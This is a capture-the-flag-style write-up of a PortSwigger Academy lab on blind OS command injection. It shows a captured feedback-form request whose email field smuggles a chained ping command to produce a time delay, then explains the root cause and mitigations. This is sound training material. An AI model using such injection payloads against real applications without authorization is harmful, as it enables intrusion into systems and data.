💻 Blind OS Command Injection – With Time Delays
🧠 Difficulty: Apprentice
📚 Platform: PortSwigger Web Security Academy
👩‍💻 Author: Kaouthar Belkebir

📌 Lab Description
This lab is vulnerable to blind OS command injection via the feedback form.

The application executes a shell command based on submitted data but doesn't return the output.

✅ Goal: Exploit the command injection to perform a time delay using ping, confirming code execution.

🧪 Exploitation Strategy
🧩 The Trick:
Because it's blind, we can't see the output. So we use a time delay (like ping) to confirm our payload was executed.

📥 Intercepted Request (via Burp Suite)
http
Copy
Edit
POST /feedback/submit HTTP/2
Host: [LAB_DOMAIN]
Cookie: session=pKZ4noaM5dQpCAdmpBSs1eCJKla9waju
Content-Type: application/x-www-form-urlencoded

csrf=1fTchPuz1jar4RwGcM0foTEAyVb9rxhR&
name=helio&
email=ha||ping+-c+10+127.0.0.1||cer@gmail.com&
subject=hello&
message=hakennhu
⏱️ When this request is sent, the response takes ~10 seconds, confirming that the ping command ran successfully.

🧠 Why This Works
ping -c 10 127.0.0.1 makes the system wait around 10 seconds before continuing.

Injecting it inside the email field using:

bash
Copy
Edit
ha||ping -c 10 127.0.0.1||cer@gmail.com
chains the command before the email is processed.

🔬 Root Cause
The server-side logic concatenates the email input directly into a shell command.

There's no sanitization or escaping, so injected commands are executed by the shell.

✅ Confirmation & Solution
If the server pauses (i.e. takes noticeably longer to respond), it means the command was injected and executed.

✅ This confirms the vulnerability and solves the lab.

🛡️ Mitigation Strategies
NEVER inject raw user input into shell commands.

Use safe APIs or proper command sanitization.

Implement input validation (e.g., regex or allow-list based).

🖼️ Screenshot
(Insert a screenshot showing the slow server response or Burp timing — if you captured it)

md
Copy
Edit
![Blind OS Command Injection – Time Delay](https://github.com/kabilala/your_repo/blob/main/images/blind-os-injection-lab2.png?raw=true)
